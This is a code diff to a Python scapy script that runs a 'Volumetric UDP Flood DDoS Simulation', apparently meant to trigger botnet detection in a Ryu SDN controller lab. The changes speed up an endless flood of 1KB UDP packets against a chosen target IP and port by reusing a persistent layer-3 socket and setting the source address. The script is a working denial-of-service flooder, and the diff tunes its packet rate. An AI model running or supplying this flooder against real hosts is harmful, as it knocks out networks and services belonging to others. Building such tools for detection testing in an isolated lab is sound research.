@@ -12,7 +12,7 @@ botnet behavior, triggering the telemetry detection of the Ryu controller.
 import argparse
 import random
 import time
-from scapy.all import IP, UDP, Raw, send
+from scapy.all import IP, UDP, Raw
 
 def main():
     parser = argparse.ArgumentParser(description="Volumetric UDP Flood DDoS Simulation")
@@ -26,11 +26,30 @@ def main():
     print(f"[*] Starting UDP flood attack against {target_ip}:{target_port}")
     print("[*] Press Ctrl+C to stop.")
 
+    import socket
+    def get_local_ip():
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            s.connect((target_ip, 1))
+            return s.getsockname()[0]
+        except Exception:
+            return '127.0.0.1'
+        finally:
+            s.close()
+            
+    src_ip = get_local_ip()
+    print(f"[*] Source IP resolved as: {src_ip}")
+
     # Payload for the UDP packets to add some volume
     payload = b"X" * 1024  # 1KB payload
 
     packet_count = 0
     start_time = time.time()
+
+    # Open a persistent Layer 3 socket to drastically increase PPS
+    # by avoiding the overhead of opening/closing a socket per packet.
+    from scapy.all import conf
+    sock = conf.L3socket()
 
     try:
         while True:
@@ -39,10 +58,10 @@ def main():
             src_port = random.randint(1024, 65535)
 
             # Construct the packet
-            packet = IP(dst=target_ip) / UDP(sport=src_port, dport=target_port) / Raw(load=payload)
+            packet = IP(src=src_ip, dst=target_ip) / UDP(sport=src_port, dport=target_port) / Raw(load=payload)
 
-            # Send the packet (verbose=0 to suppress scapy's default output)
-            send(packet, verbose=0)
+            # Send the packet via the persistent socket
+            sock.send(packet)
             
             packet_count += 1
 
